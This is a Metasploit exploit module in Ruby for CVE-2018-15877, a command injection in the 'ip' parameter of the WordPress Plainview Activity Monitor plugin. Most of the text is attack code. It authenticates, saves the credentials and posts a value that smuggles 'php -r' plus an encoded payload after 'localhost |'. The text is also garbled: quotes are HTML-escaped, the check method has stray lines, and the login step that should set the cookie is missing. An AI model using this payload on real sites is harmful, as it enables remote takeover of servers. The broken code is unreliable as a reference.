# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      &#039;Description&#039;    => %q{
          command injection which allows an attacker to remotely execute
          commands on underlying system. Application passes unsafe user supplied
          data to ip parameter into activities_overview.php.
          Privileges are required in order to exploit this vulnerability.

          Vulnerable plugin version: 20161228 and possibly prior
          Fixed plugin version: 20180826
      },
      &#039;Author&#039;  =>
        [
          &#039;LydA(c)ric LEFEBVRE&#039;, # Vulnerability discovery
          &#039;Leo LE BOUTER&#039;, # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2018-15877&#039; ],
          [ &#039;EDB&#039;, &#039;45274&#039; ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => &#039;&>\&#039;&#039;,
        },
      &#039;Targets&#039;        => [[&#039;WordPress&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Aug 26 2018&#039;
      ))

      register_options(
        [
          OptString.new(&#039;USERNAME&#039;, [ true,  "The user to authenticate as"]),
          OptString.new(&#039;PASSWORD&#039;, [ true,  "The password to authenticate with" ])
        ])

      register_advanced_options(
        [
          OptBool.new(&#039;ForceExploit&#039;,  [ false, &#039;Override check result&#039;, false ]),
        ])
  end

  def check
      return CheckCode::Unknown
    end
    check_plugin_version_from_readme(&#039;plainview-activity-monitor&#039;, &#039;20180826&#039;)
  end

  def exploit
    check_code = check
    unless check_code == CheckCode::Detected || check_code == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    user = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]

    print_status("Trying to login...")
    if cookie.nil?
      fail_with(Failure::NoAccess, "#{peer} - Login wasn&#039;t successful")
    end
    print_good("Login Successful")
    store_valid_credential(user: user, private: password, proof: cookie)

    uri = normalize_uri(target_uri.path, &#039;wp-admin/admin.php&#039;)

    vars_get = {
      &#039;page&#039; => &#039;plainview_activity_monitor&#039;,
      &#039;tab&#039;  => &#039;activity_tools&#039;
    }

    vars_post = {
      &#039;ip&#039;     => "localhost | php -r &#039;#{payload.encoded}&#039;",
      &#039;lookup&#039; => &#039;Lookup&#039;,
      &#039;submit&#039; => &#039;Submit request&#039;
    }

    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;cookie&#039;    => cookie,
      &#039;uri&#039;       => uri,
      &#039;vars_get&#039;  => vars_get,
      &#039;vars_post&#039; => vars_post
    )
  end
end

